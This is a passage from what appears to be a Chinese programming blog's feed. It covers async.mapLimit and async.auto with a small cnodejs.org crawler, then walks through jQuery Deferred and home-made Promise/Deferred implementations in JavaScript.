</span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (err) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="built_in">console</span>.error(err);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">var</span> topicUrls = [];</span><br><span class="line">    <span class="keyword">var</span> $ = cheerio.load(res.text);</span><br><span class="line">    <span class="comment">// 获取首页所有的链接</span></span><br><span class="line">    $(<span class="string">'#topic_list .topic_title'</span>).each(<span class="function"><span class="keyword">function</span> (<span class="params">idx, element</span>) </span>&#123;</span><br><span class="line">      <span class="keyword">var</span> $element = $(element);</span><br><span class="line">      <span class="keyword">var</span> href = url.resolve(cnodeUrl, $element.attr(<span class="string">'href'</span>));</span><br><span class="line">      topicUrls.push(href);</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">console</span>.log(topicUrls);</span><br><span class="line">    afterGetTopicUrls(topicUrls);</span><br><span class="line">  &#125;);</span><br></pre></td></tr></table></figure></p><h2 id="async-map"><a href="#async-map" class="headerlink" title="async.map()"></a>async.map()</h2><p>上面的抓取例子同样可以用<code>async.mapLimit()</code>改写（加入了并发量监测）:<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> concurrencyCount = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> cnodeUrl = <span class="string">'https://cnodejs.org/'</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fetchUrl</span>(<span class="params">url,cb</span>)</span>&#123;</span><br><span class="line">    concurrencyCount++;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'现在的并发数是'</span>, concurrencyCount, <span class="string">'，正在抓取的是'</span>, url);</span><br><span class="line">    superagent.get(url)</span><br><span class="line">    .end(<span class="function">(<span class="params">err,res</span>)=&gt;</span>&#123;</span><br><span class="line">        concurrencyCount--;</span><br><span class="line">        cb(<span class="literal">null</span>,[url,res.text]);</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">superagent.get(cnodeUrl)</span><br><span class="line">  .end(<span class="function"><span class="keyword">function</span> (<span class="params">err, res</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (err) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="built_in">console</span>.error(err);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">var</span> topicUrls = [];</span><br><span class="line">    <span class="keyword">var</span> $ = cheerio.load(res.text);</span><br><span class="line">    <span class="comment">// 获取首页所有的链接</span></span><br><span class="line">    $(<span class="string">'#topic_list .topic_title'</span>).each(<span class="function"><span class="keyword">function</span> (<span class="params">idx, element</span>) </span>&#123;</span><br><span class="line">      <span class="keyword">var</span> $element = $(element);</span><br><span class="line">      <span class="keyword">var</span> href = url.resolve(cnodeUrl, $element.attr(<span class="string">'href'</span>));</span><br><span class="line">      topicUrls.push(href);</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">async</span>.mapLimit(topicUrls, <span class="number">5</span>, <span class="function"><span class="keyword">function</span> (<span class="params">url, callback</span>) </span>&#123;</span><br><span class="line">        fetchUrl(url, callback);</span><br><span class="line">      &#125;, <span class="function"><span class="keyword">function</span> (<span class="params">err, topics</span>) </span>&#123;</span><br><span class="line">            topics = topics.map(<span class="function"><span class="keyword">function</span> (<span class="params">topicPair</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">var</span> topicUrl = topicPair[<span class="number">0</span>];</span><br><span class="line">            <span class="keyword">var</span> topicHtml = topicPair[<span class="number">1</span>];</span><br><span class="line">            <span class="keyword">var</span> $ = cheerio.load(topicHtml);</span><br><span class="line">            <span class="keyword">return</span> (&#123;</span><br><span class="line">            title: $(<span class="string">'.topic_full_title'</span>).text().trim(),</span><br><span class="line">            href: topicUrl,</span><br><span class="line">            comment1: $(<span class="string">'.reply_content'</span>).eq(<span class="number">0</span>).text().trim(),</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;);</span><br><span class="line">    </span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">'final:'</span>);</span><br><span class="line">        <span class="built_in">console</span>.log(topics);</span><br><span class="line">      &#125;);</span><br><span class="line">  &#125;);</span><br></pre></td></tr></table></figure></p><p>运行截图：</p><p><img src="http://7xsi10.com1.z0.glb.clouddn.com/crawler.png" alt="http://7xsi10.com1.z0.glb.clouddn.com/crawler.png"></p><h2 id="async-auto"><a href="#async-auto" class="headerlink" title="async.auto()"></a>async.auto()</h2><p>这个可以所是最灵活的流程控制方法了，可以根据依赖情况进行流程控制:</p><p>沿用官方例子:<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">async</span>.auto(&#123;</span><br><span class="line">    get_data: <span class="function"><span class="keyword">function</span>(<span class="params">callback</span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">'in get_data'</span>);</span><br><span class="line">        <span class="comment">// async code to get some data</span></span><br><span class="line">        callback(<span class="literal">null</span>, <span class="string">'data'</span>, <span class="string">'converted to array'</span>);</span><br><span class="line">    &#125;,</span><br><span class="line">    make_folder: <span class="function"><span class="keyword">function</span>(<span class="params">callback</span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">'in make_folder'</span>);</span><br><span class="line">        <span class="comment">// async code to create a directory to store a file in</span></span><br><span class="line">        <span class="comment">// this is run at the same time as getting the data</span></span><br><span class="line">        callback(<span class="literal">null</span>, <span class="string">'folder'</span>);</span><br><span class="line">    &#125;,</span><br><span class="line">    write_file: [<span class="string">'get_data'</span>, <span class="string">'make_folder'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">results, callback</span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">'in write_file'</span>, <span class="built_in">JSON</span>.stringify(results));</span><br><span class="line">        <span class="comment">// once there is some data and the directory exists,</span></span><br><span class="line">        <span class="comment">// write the data to a file in the directory</span></span><br><span class="line">        callback(<span class="literal">null</span>, <span class="string">'filename'</span>);</span><br><span class="line">    &#125;],</span><br><span class="line">    email_link: [<span class="string">'write_file'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">results, callback</span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">'in email_link'</span>, <span class="built_in">JSON</span>.stringify(results));</span><br><span class="line">        <span class="comment">// once the file is written let's email a link to it...</span></span><br><span class="line">        <span class="comment">// results.write_file contains the filename returned by write_file.</span></span><br><span class="line">        callback(<span class="literal">null</span>, &#123;<span class="string">'file'</span>:results.write_file, <span class="string">'email'</span>:<span class="string">'user@example.com'</span>&#125;);</span><br><span class="line">    &#125;]</span><br><span class="line">&#125;, <span class="function"><span class="keyword">function</span>(<span class="params">err, results</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'err = '</span>, err);</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'results = '</span>, results);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>异步流程控制方案有许多，包括<code>eventproxy</code>事件订阅的思路，<code>connect</code>模块的<code>next</code>尾触发的方案等。async支持函数式的集合操作，流程控制，和一些常用工具，支持并发控制等。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;async是一个异步操作工具集，其集合操作完美地融合了函数式编程。其各种流程控制API适合各种应用场景。本文总结一些常用的。&lt;/p&gt;
    
    </summary>
    
      <category term="JavaScript" scheme="http://luoxia.me/code/categories/JavaScript/"/>
    
    
      <category term="异步编程" scheme="http://luoxia.me/code/tags/%E5%BC%82%E6%AD%A5%E7%BC%96%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>I Promise</title>
    <link href="http://luoxia.me/code/2016/08/28/I%20Promise/"/>
    <id>http://luoxia.me/code/2016/08/28/I Promise/</id>
    <published>2016-08-28T13:19:07.000Z</published>
    <updated>2017-11-16T13:10:06.484Z</updated>
    
    <content type="html"><![CDATA[<p>正如标题那样，Promise对未来某个事件做出承诺，比如<code>如果成功，那么...；如果失败，那么...</code>。是一种相对于回调和事件订阅更高级的抽象，本文就从其起源，实现，面临的问题等方面分析Promise。</p><a id="more"></a><p>Promise被广为所知是来自于Jquery的Promise/Deferred：</p><h1 id="Jquery-Promise-Deferred"><a href="#Jquery-Promise-Deferred" class="headerlink" title="Jquery Promise/Deferred"></a>Jquery Promise/Deferred</h1><p><code>$.when()</code>:如果向 jQuery.when 传入一个延迟对象，那么会返回它的 Promise 对象(延迟方法的一个子集)。可以继续绑定 Promise 对象的其它方法，例如， defered.then 。当延迟对象已经被受理（resolved）或被拒绝(rejected）（通常是由创建延迟对象的最初代码执行的），那么就会调用适当的回调函数。</p><p>有多个延迟对象传递给jQuery.when ，该方法返回一个新的“宿主”延迟对象，跟踪所有已通过Deferreds聚集状态。 当所有的延迟对象被受理（resolve）时，该方法才会受理它的 master 延迟对象。当其中有一个延迟对象被拒绝（rejected）时，该方法就会拒绝它的 master 延迟对象。如果 master 延迟对象被受理（resolved），那么会传入所有延迟对象的受理（resolved）值，这些延迟对象指的就是传给 jQuery.when 的参数。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> dtd = $.Deferred();</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">wait</span>(<span class="params">dtd</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">let</span> tasks = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">"执行完毕"</span>);</span><br><span class="line">            dtd.resolve(<span class="string">"hello"</span>,<span class="string">"恩恩"</span>,<span class="string">"你在哪儿"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        setTimeout(tasks,<span class="number">5000</span>);</span><br><span class="line">        <span class="keyword">return</span> dtd;</span><br><span class="line">    &#125;</span><br><span class="line">    $.when(wait(dtd))</span><br><span class="line">    .done(<span class="function">(<span class="params">a1,a2,a3</span>)=&gt;</span><span class="built_in">console</span>.log(a1,a2,a3))</span><br><span class="line">    .fail(<span class="function"><span class="params">()</span>=&gt;</span><span class="built_in">console</span>.log(<span class="string">"完了"</span>))</span><br><span class="line"></span><br><span class="line">    dtd.resolve(<span class="string">"lfjaljfl"</span>,<span class="string">"hfaljfla"</span>,<span class="string">"hhhhh"</span>)</span><br></pre></td></tr></table></figure></p><p>上述做法有问题，因为<code>wait</code>方法暴露出的是Deferred对象，含有可以改变内部状态的方法，可以被外界代码随时用于改变状态，如上面的例子，在外面调用了<code>resolve</code>方法，则一开始就会调用<code>done</code>方法的回调，后面<code>wait</code>内异步操作执行完毕不会再执行<code>done</code>的回调了。</p><p>换种方式：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">wait1</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">let</span> dtd = $.Deferred();</span><br><span class="line">    <span class="keyword">let</span> tasks = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">"执行完毕"</span>);</span><br><span class="line">        dtd.resolve(<span class="string">"hello"</span>,<span class="string">"恩恩"</span>,<span class="string">"你在哪儿1"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    setTimeout(tasks,<span class="number">5000</span>);</span><br><span class="line">    <span class="keyword">return</span> dtd.promise();</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">wait2</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">let</span> dtd = $.Deferred();</span><br><span class="line">    <span class="keyword">let</span> tasks = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">"执行完毕"</span>);</span><br><span class="line">        dtd.resolve(<span class="string">"hello"</span>,<span class="string">"恩恩"</span>,<span class="string">"你在哪儿2"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    setTimeout(tasks,<span class="number">6000</span>);</span><br><span class="line">    <span class="keyword">return</span> dtd.promise();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$.when(wait1(),wait2())</span><br><span class="line">.then(<span class="function">(<span class="params">r1,r2</span>)=&gt;</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">"r1.concat(r2)"</span></span><br><span class="line">&#125;).then(<span class="function"><span class="params">rs</span>=&gt;</span><span class="built_in">console</span>.log(rs)) </span><br><span class="line"> <span class="comment">//["hello", "恩恩", "你在哪儿1"] ["hello", "恩恩", "你在哪儿2"]</span></span><br></pre></td></tr></table></figure></p><p>deferred.promise() 方法允许一个异步函数阻止那些干涉其内部请求的进度（progress）或状态（status）的其它代码。Promise （承诺）对象仅会暴露那些需要绑定额外的处理或判断状态的延迟方法(then, done, fail, always, pipe, progress, 和 state)时，并不会暴露任何用于改变状态的延迟方法(resolve, reject, notify, resolveWith, rejectWith, 和 notifyWith).</p><h1 id="Promise-A"><a href="#Promise-A" class="headerlink" title="Promise/A"></a>Promise/A</h1><p>09年，Promise/Deferred模式被抽象为一个提议草案发布在CommonJS规范中，后来抽象出了一系列模型，包括<code>Promise/A</code>,具体标准请看<a href="https://promisesaplus.com/" target="_blank" rel="noopener">https://promisesaplus.com/</a></p><p><img src="https://mdn.mozillademos.org/files/8633/promises.png" alt="https://mdn.mozillademos.org/files/8633/promises.png"></p><h2 id="Pub-Sub实现"><a href="#Pub-Sub实现" class="headerlink" title="Pub/Sub实现"></a>Pub/Sub实现</h2><p>这个就可以看做是事件订阅模式和Promise的小小联系。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> EventEmitter = <span class="built_in">require</span>(<span class="string">"events"</span>);</span><br><span class="line"><span class="keyword">const</span> util = <span class="built_in">require</span>(<span class="string">"util"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> <span class="built_in">Promise</span> = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    EventEmitter.call(<span class="keyword">this</span>);</span><br><span class="line">&#125;;</span><br><span class="line">util.inherits(<span class="built_in">Promise</span>,EventEmitter);</span><br><span class="line"></span><br><span class="line"><span class="built_in">Promise</span>.prototype.then = <span class="function"><span class="keyword">function</span>(<span class="params">fulfilledHandler,errorHandler,progressHandler</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">typeof</span> fulfilledHandler === <span class="string">'function'</span>)&#123;</span><br><span class="line">        <span class="keyword">this</span>.once(<span class="string">'success'</span>,fulfilledHandler);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">typeof</span> errorHandler === <span class="string">'function'</span>)&#123;</span><br><span class="line">        <span class="keyword">this</span>.once(<span class="string">'error'</span>,errorHandler);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">typeof</span> progressHandler === <span class="string">'function'</span>)&#123;</span><br><span class="line">        <span class="keyword">this</span>.once(<span class="string">'progress'</span>,progressHandler);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> Deferred = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.state = <span class="string">'unfulfilled'</span>;</span><br><span class="line">    <span class="keyword">this</span>.promise = <span class="keyword">new</span> <span class="built_in">Promise</span>();</span><br><span class="line">&#125;</span><br><span class="line">Deferred.prototype.resolve = <span class="function"><span class="keyword">function</span>(<span class="params">obj</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.state = <span class="string">'fulfilled'</span>;</span><br><span class="line">    <span class="keyword">this</span>.promise.emit(<span class="string">'success'</span>,obj);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">Deferred.prototype.reject = <span class="function"><span class="keyword">function</span>(<span class="params">err</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.state = <span class="string">'failed'</span>;</span><br><span class="line">    <span class="keyword">this</span>.promise.emit(<span class="string">'error'</span>,err);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Deferred.prototype.progress = <span class="function"><span class="keyword">function</span>(<span class="params">data</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.promise.emit(<span class="string">'progress'</span>,data);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是，面临一个问题，那就是链式调用问题，多次调用<code>then()</code>方法，发现只会针对<code>resolve()</code>传入的value多次触发success事件,比如:<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">promisify</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">let</span> dtd = <span class="keyword">new</span> Deferred();</span><br><span class="line">    setTimeout(<span class="function"><span class="params">()</span>=&gt;</span>dtd.resolve(<span class="string">"hello1"</span>),<span class="number">3000</span>);</span><br><span class="line">    <span class="keyword">return</span> dtd.promise;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">promisify2</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">let</span> dtd = <span class="keyword">new</span> Deferred();</span><br><span class="line">    setTimeout(<span class="function"><span class="params">()</span>=&gt;</span>dtd.resolve(<span class="string">"hello2"</span>),<span class="number">3000</span>);</span><br><span class="line">    <span class="keyword">return</span> dtd.promise;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 并不能正常完成序列执行的链式调用。</span></span><br><span class="line">promisify()</span><br><span class="line">    .then(<span class="function"><span class="params">result</span>=&gt;</span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(result)</span><br><span class="line">        <span class="keyword">return</span> promisify2();</span><br><span class="line">    &#125;)</span><br><span class="line">    .then(<span class="function"><span class="params">result</span>=&gt;</span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(result);</span><br><span class="line">    &#125;)</span><br><span class="line"><span class="comment">// hello1 hello1</span></span><br></pre></td></tr></table></figure></p><h2 id="链式Promise"><a href="#链式Promise" class="headerlink" title="链式Promise"></a>链式Promise</h2><p>我们要实现像jq的Promise/Deferred那样链式执行，主要处理两种情况：</p><ol><li>当<code>fulfilledHandler</code>返回非promise时，将结果作为下一个fulfilledHandler的参数；</li><li>当<code>fulfilledHandler</code>返回新的promise时，等待新的promise完成后执行后续任务;</li></ol><p>我在《深入浅出Node.js》书上的实现基础上做了一些改进和完善：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> Deferred = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.promise = <span class="keyword">new</span> <span class="built_in">Promise</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Deferred.prototype.resolve = <span class="function"><span class="keyword">function</span>(<span class="params">...obj</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">let</span> promise = <span class="keyword">this</span>.promise;</span><br><span class="line">    <span class="keyword">let</span> handler;</span><br><span class="line">    <span class="keyword">while</span>((handler=promise.queue.shift()))&#123;</span><br><span class="line">        <span class="keyword">if</span>(handler &amp;&amp; handler.fulfilled) &#123;</span><br><span class="line">            <span class="keyword">let</span> ret = handler.fulfilled(...obj);</span><br><span class="line">            <span class="keyword">if</span>(ret &amp;&amp; ret.isPromise)&#123;</span><br><span class="line">                <span class="comment">/*</span></span><br><span class="line"><span class="comment">                如果返回的是新的Promise，将deferred的promise指向新的promise,并转交任务队列，然后终止循环执行任务队列，等到控制新的promise状态的deferred对象调用了resolve才再一次来到循环。</span></span><br><span class="line"><span class="comment">                */</span></span><br><span class="line">                ret.queue = promise.queue;</span><br><span class="line">                <span class="keyword">this</span>.promise = ret;</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            obj = [ret]; <span class="comment">//如果返回非promise,就继续执行后续任务，并将返回值作为下一个任务的回调参数。</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Deferred.prototype.reject = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;&#125;　<span class="comment">//省略</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> <span class="built_in">Promise</span> = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.queue = [];</span><br><span class="line">    <span class="keyword">this</span>.isPromise = <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">Promise</span>.prototype.then = <span class="function"><span class="keyword">function</span>(<span class="params">fulfilledHandler,errorHandler,progressHandler</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">let</span> handler = &#123;&#125;;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">typeof</span> fulfilledHandler === <span class="string">'function'</span>)&#123;</span><br><span class="line">        handler.fulfilled = fulfilledHandler;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">typeof</span> errorHandler === <span class="string">'function'</span>)&#123;</span><br><span class="line">        handler.error = errorHandler;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 每次调用then,都将回调加入到队列里</span></span><br><span class="line">    <span class="keyword">this</span>.queue.push(handler);</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//对Promise/Deferred的封装，符合规范的语法</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">promise</span>(<span class="params">resolver</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> resolver !== <span class="string">"function"</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">TypeError</span>(<span class="string">"resolver must be a function."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">var</span> deferred = <span class="keyword">new</span> Deferred();</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        resolver(deferred.resolve.bind(deferred), </span><br><span class="line">            deferred.reject.bind(deferred));</span><br><span class="line">    &#125; <span class="keyword">catch</span> (reason) &#123;</span><br><span class="line">        deferred.reject(reason);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> deferred.promise;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>可以看到实现思想还是<code>Promise/Deferred</code>，<code>Deferred</code>来管理状态，每个Promise实例里边维护一个任务队列，通过<code>then</code>调用将任务加入到队列里边，<code>Deferred</code>调用<code>resolve</code>或<code>reject</code>改变状态，并挨个执行任务队列里的任务，但是遇到某个任务返回新的Promise时，需要暂停任务执行，将任务队列转交，并等待新的异步任务完成后继续执行任务。</p><p>最后对<code>Promise/Deferred</code>进行了封装，形成最终与标准语法相近的<code>promise</code>构造函数。</p><p>上述例子只是一个粗略的实现，还有许多细节问题，比如错误处理，在<code>fulfilled</code>函数里抛出错误的处理，<code>catch</code>实现，其他重要接口，如<code>Promise.all(),Promise.race()</code>等。</p><h2 id="存在的问题"><a href="#存在的问题" class="headerlink" title="存在的问题:"></a>存在的问题:</h2><ol><li><p>对于异步操作API，需要进行封装才能成为Promise对象，可以借助第三方API进行快速封装。</p></li><li><p>太复杂的异步场景，会使得链式过长。</p></li></ol><h2 id="第三方实现"><a href="#第三方实现" class="headerlink" title="第三方实现"></a>第三方实现</h2><p>bluebird: <a href="https://github.com/kriskowal/q" target="_blank" rel="noopener">https://github.com/kriskowal/q</a></p><p>Q: <a href="https://github.com/kriskowal/q" target="_blank" rel="noopener">https://github.com/kriskowal/q</a></p><p>when: <a href="https://github.com/cujojs/when" target="_blank" rel="noopener">https://github.com/cujojs/when</a></p><h2 id="官方标准实现"><a href="#官方标准实现" class="headerlink" title="官方标准实现"></a>官方标准实现</h2><p>参照ES6 <code>Promise</code>标准。</p>]]></content>
    
    <summary type="html">
    
